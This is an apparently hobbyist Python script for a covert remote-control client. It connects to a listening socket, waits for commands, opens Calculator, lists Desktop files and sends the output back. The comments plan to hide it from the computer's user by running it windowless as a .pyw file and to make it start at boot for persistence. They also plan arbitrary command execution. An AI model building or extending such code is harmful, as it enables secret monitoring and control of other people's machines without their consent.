import socket
import os
import subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((socket.gethostname(), 1234))
# this file should be run in the background so the person using the pc is not aware of the process running
# For this to happen, use the extension.pyw,
# which will cause the script to be executed by pythonw.exe by default.
# This prevents the terminal window from appearing when the computer is first booted.
# https://coduber.com/run-python-script-constantly-in-background/


# Additionally, we also want to look at making the tool automatically boot up on start up.
# This can be done by adding the exe on the start-up directory but not essential

#For the cmd part
# https://www.stackvidhya.com/execute-system-command-or-shell-command-python/
#https://datatofish.com/command-prompt-python/


while (True):
    msg = s.recv(1024)
    decodedMsg = msg.decode("utf-8")
    print(decodedMsg)
    if decodedMsg == "s":
        print('Shutting Down')
        #send confirmation
        s.sendall(bytes("shutting down","utf-8"))
        # os.system("shutdown /s /t 1")
        # The command shuts down the pc so avoid running it
    if decodedMsg == "openCalc":
        os.system('cmd /c "calc"')
        s.sendall(bytes("opened calc","utf-8"))

    if decodedMsg == "test":
        result = subprocess.run(['dir', 'Desktop'], capture_output=True, shell=True)
        print(result.stdout.decode())
        s.sendall(bytes(result.stdout.decode(), "utf-8"))
    if decodedMsg == "test1":
        command = "dir Desktop & echo 'All the files and folders are listed'"
        result = subprocess.run(command, stdout=subprocess.PIPE, shell=True)
        print(result.stdout.decode())
        s.sendall(bytes(result.stdout.decode(), "utf-8"))

    # https://docs.python.org/3/library/subprocess.html#subprocess.Popen.communicate
    # here we can see that we can get output from certain executions so maybe we can use this to execute commands one by one
    # could include like command and then choose which command to use

